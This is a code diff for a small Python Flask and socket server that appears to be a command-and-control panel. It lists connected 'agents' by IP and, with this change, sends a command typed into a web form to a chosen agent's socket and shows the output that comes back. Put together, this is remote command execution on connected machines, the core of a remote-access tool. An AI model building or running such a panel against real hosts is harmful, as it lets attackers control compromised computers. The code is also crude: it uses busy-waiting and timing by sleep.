@@ -27,15 +27,15 @@ def handle_conn(connection, address, thread_index):
     global CMD_INPUT
     global CMD_OUTPUT
     global active_connections
-    #global thread_index  # Declare thread_index as global
     active_connections += 1
-    msg = connection.recv(2048).decode()
-    CMD_OUTPUT[thread_index] = msg
-    while CMD_INPUT[thread_index] != 'quit' and CMD_INPUT[thread_index] != '':
-        msg = CMD_INPUT[thread_index]
-        connection.send(msg.encode())
+    while CMD_INPUT[thread_index] != 'quit':
         msg = connection.recv(2048).decode()
         CMD_OUTPUT[thread_index] = msg
+        while True:
+            if CMD_INPUT[thread_index]!='':
+                msg = CMD_INPUT[thread_index]
+                connection.send(msg.encode())
+                break
     active_connections -= 1
     connection_sakkaune(connection)
 
@@ -59,7 +59,7 @@ def server_socket():
         thread_index=len(THREADS)
         t = threading.Thread(target=handle_conn, args=(connection, address,len(THREADS)))
         THREADS.append(t)
-        IPS[thread_index]=address
+        IPS.append(address)
         print(f"Active connections: {active_connections}")
         t.start()
 
@@ -79,16 +79,24 @@ def index():
 def agents():
     return render_template('agents.html',threads=THREADS,ips=IPS)
 
+
+
 @app.route('/<agentname>/executecmd')
 def executecmd(agentname):
-    return render_template("execute.html")
+    return render_template("execute.html",name=agentname)
 
-@app.route('/<agentname>/execute')
+
+@app.route('/<agentname>/execute',methods=['GET','POST'])
 def execute(agentname):
-    pass
-    #if request.method=='POST':
-       # cmd=request.form['command']
-
+    if request.method=='POST':
+       cmd=request.form['command']
+       for i in THREADS:
+           if agentname in i.name:
+               req_index=THREADS.index(i)
+               CMD_INPUT[req_index]=cmd
+               time.sleep(1)
+               cmdoutput=CMD_OUTPUT[req_index]
+               return render_template("execute.html",cmdoutput=cmdoutput,name=agentname) 
 
 if __name__=='__main__':
     app.run(debug=True)
